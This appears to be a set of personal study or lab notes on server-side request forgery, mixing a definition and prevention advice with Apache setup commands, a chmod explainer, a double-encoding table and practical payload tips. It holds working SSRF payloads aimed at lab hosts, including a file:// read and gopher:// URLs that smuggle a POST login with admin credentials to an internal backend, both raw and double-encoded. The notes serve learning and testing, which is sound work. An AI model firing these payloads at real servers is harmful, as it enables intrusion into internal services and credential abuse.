# üåê What is SSRF? (Server-Side Request Forgery)

## üß† Definition

**Server-Side Request Forgery (SSRF)** is a web security vulnerability that allows an attacker to make the server perform HTTP requests to **internal or external resources** on their behalf.

In SSRF, the attacker abuses functionality that fetches data from a URL, such as:

- Image URL previews
- PDF renderers
- URL validators
- Webhooks or callbacks

---

## ‚öôÔ∏è How SSRF Works

A vulnerable application accepts a user-supplied URL and makes a server-side HTTP request, like:

```http
GET /fetch?url=http://example.com
``` 

An attacker can change the url parameter to:

```http
/fetch?url=http://localhost:8000/admin
```

#### üîç Why SSRF is Dangerous

SSRF lets attackers:

    - Access internal services (e.g., http://localhost, http://127.0.0.1, http://backend)

    - Enumerate cloud metadata services (e.g., AWS: http://169.254.169.254)

    - Bypass firewalls and reach networks inaccessible from the outside

    - Read internal configuration files or sensitive endpoints

    - Potentially trigger Remote Code Execution (RCE) or leak credentials

#### üß™ SSRF Example

Vulnerable Request:
```http
GET /fetch?url=http://example.com
```

Exploited by Attacker:
```http
GET /fetch?url=http://localhost:8000/admin
```

Server Makes Internal Request:
```http
[Server] --> http://localhost:8000/admin
```

üõ°Ô∏è How to Prevent SSRF

    - Whitelist allowed URLs or domains

    - Validate user input strictly (e.g., disallow IPs, internal hostnames)

    - Block requests to:

        localhost, 127.0.0.1, ::1

        Reserved IP ranges (10.0.0.0/8, 192.168.0.0/16, etc.)

    - Use network segmentation: separate internal APIs from public-facing web apps

    - Monitor server traffic for unusual outbound HTTP requests

```shell
cd /var/www/html
```


```shell
sudo echo "Here is your 200 OK response" > target
```

```shell
sudo chmod 644 target
```

```shell
sudo systemctl start apache2
```

```shell
sudo systemctl restart apache2
```

```shell
sudo systemctl status apache2
```

```shell
call ip/target
```

# `sudo chmod 644` ‚Äî Examples, Explanations & Use Cases

## What does `chmod 644` mean?

`chmod 644` sets the following file permissions:

- **Owner** ‚Üí Read + Write (`rw-`)
- **Group** ‚Üí Read only (`r--`)
- **Others (Everyone else)** ‚Üí Read only (`r--`)

In numeric form:

| Entity | Permission | Binary | Octal |
|--------|------------|--------|-------|
| Owner  | rw-        | 110    | 6     |
| Group  | r--        | 100    | 4     |
| Others | r--        | 100    | 4     |

## When to use `chmod 644`?

- On **public files** that should be readable by everyone, but only editable by the owner.
- On **HTML files** and **static website content** (Apache/Nginx).
- On **configuration files** readable by system processes but only editable by admins.
- On **scripts** that are not intended to be executed directly.

## Common `chmod 644` Commands

### 1Ô∏è‚É£ Single File
```bash
sudo chmod 644 filename.txt
```

#### When Double Encoding is Required:

You only need to double-encode non-alphanumeric and reserved characters, such as:

| Character | 1st Encode | 2nd Encode |
| --------- | ---------- | ---------- |
| `/`       | `%2F`      | `%252F`    |
| `:`       | `%3A`      | `%253A`    |
| `\n`      | `%0A`      | `%250A`    |
| `\r`      | `%0D`      | `%250D`    |
| space     | `%20`      | `%2520`    |
| `%`       | `%25`      | `%2525`    |
| `&`       | `%26`      | `%2526`    |
| `=`       | `%3D`      | `%253D`    |
| `?`       | `%3F`      | `%253F`    |
| `#`       | `%23`      | `%2523`    |
| `@`       | `%40`      | `%2540`    |

####  General advice regarding SSRF:
    - 1) Have a shelf-prepared payload that requires the least possible changes: Pick a username and password that you know the post data length will be static. Therefore, you wont need to change Content-Length each time.
    - 2) Important note: If you are sending your SSRF payload through the web application itself, you need to encode your payload once. If you are sending it through repeater, you need to encode it twice.
    - 3) Make sure the content-type field is correct.
    - 4) If you have a consistent payload, you only need to change the URI and HOST field.
    - 5) In post requests, there is 2 new lines between the HTTP header requests and post data (%0A%0A).
    - 6) Gopher runs on port 70. Make sure to specify the correct port number in your URL. 

```shell
file:///app/target.txt
```

```shell
gopher://127.0.0.1:80/_GET%20/target%20HTTP/1.1%0a
```

```url
http://target/flag?password=admin&apiKey=key
```

```url
gopher://backend:80/_POST /login HTTP/1.1
Host: backend
Content-Type: application/x-www-form-urlencoded
Content-Length: 41

username=admin&password=admin
```

```shell
gopher://backend:80/_POST%20/login%20HTTP/1.1%0AHost:%20backend%0AContent-Type:%20application/x-www-form-urlencoded%0AContent-Length:%2041%0A%0Ausername=admin&password=admin
```


```shell
gopher%3A%2F%2Fbackend%3A80%2F_POST%2520%2Flogin%2520HTTP%2F1.1%250AHost%3A%2520backend%250AContent-Type%3A%2520application%2Fx-www-form-urlencoded%250AContent-Length%3A%252041%250A%250Ausername%3Dadmin%26password%3Dadmin

#### üì¨ Client Request Headers

| Header                                        | Meaning                                                         |
| --------------------------------------------- | --------------------------------------------------------------- |
| `Host: ssrf-sandbox`                          | Target domain or IP the request is being sent to.               |
| `Connection: keep-alive`                      | Keeps the TCP connection open for reuse, improving performance. |
| `Upgrade-Insecure-Requests: 1`                | Tells the server to prefer HTTPS over HTTP.                     |
| `User-Agent: Mozilla/5.0 (...) Firefox/128.0` | Identifies the browser and OS being used.                       |
| `Accept: text/html,application/xhtml+xml,...` | Lists content types the browser can process.                    |
| `Accept-Encoding: gzip, deflate`              | Specifies supported compression formats.                        |
| `Accept-Language: en-US,en;q=0.5`             | Tells the server the user's preferred languages.                |
| `Priority: u=0, i`                            | HTTP/2 priority hints (low urgency, interactive content).       |

#### üì• Server Response Headers

| Header                                | Meaning                                    |
| ------------------------------------- | ------------------------------------------ |
| `Server: nginx/1.21.4`                | Web server software and version used.      |
| `Date: Fri, 13 Jun 2025 18:00:06 GMT` | Time the server generated the response.    |
| `Content-Type: application/json`      | The response is in JSON format.            |
| `Content-Length: 39`                  | Size of the response body in bytes.        |
| `Connection: keep-alive`              | The server is keeping the connection open. |


#### üîê Why These Headers Matter in SSRF or Security Testing

    - Host: ‚Äî may be manipulated in Host header attacks.

    - User-Agent: ‚Äî sometimes used for filtering or access control (can be spoofed).

    - Accept/Content-Type: ‚Äî affects how servers interpret and return data.

    ‚Åª Upgrade-Insecure-Requests: ‚Äî can influence redirects or content served.

    - Connection: ‚Äî helps keep connections open for faster exploitation in chained SSRF attacks.
